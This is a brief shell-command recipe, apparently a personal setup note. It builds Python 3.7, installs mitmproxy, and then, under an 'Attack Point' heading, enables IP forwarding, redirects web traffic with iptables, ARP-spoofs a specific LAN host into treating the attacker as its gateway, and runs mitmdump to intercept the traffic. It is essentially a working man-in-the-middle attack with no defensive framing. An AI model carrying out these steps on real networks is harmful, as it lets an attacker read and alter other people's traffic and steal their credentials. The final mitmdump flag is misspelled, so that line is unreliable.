# Install python3.7
wget https://www.python.org/ftp/python/3.7.1/Python-3.7.1.tgz
tar xzvf Python-3.7.1.tgz
sudo apt-get update
sudo apt-get install build-essential libncursesw5-dev libgdbm-dev libc6-dev zlib1g-dev libsqlite3-dev tk-dev libssl-dev openssl libffi-dev libbz2-dev -y
cd Python-3.7.1
./configure
sudo make && sudo make install
python3.7 --version
pip3.7 --version

# Install mitmproxy
pip install --upgrade pip
sudo pip3 install mitmproxy --ignore-installed

#Attack Point
First Step: iptables
sysctl -w net.ipv4.ip_forward=1
sysctl -w net.ipv6.conf.all.forwarding=1
sysctl -w net.ipv4.conf.all.send_redirects=0
iptables -t nat -A PREROUTING -i ens33 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i ens33 -p tcp --dport 443 -j REDIRECT --to-port 8080
ip6tables -t nat -A PREROUTING -i ens33 -p tcp --dport 80 -j REDIRECT --to-port 8080
ip6tables -t nat -A PREROUTING -i ens33 -p tcp --dport 443 -j REDIRECT --to-port 8080
Second Step: arpCheck
arpspoof -i ens33 -t 192.168.145.168 192.168.145.2

# Run mitmproxy
mitmdump --model transprent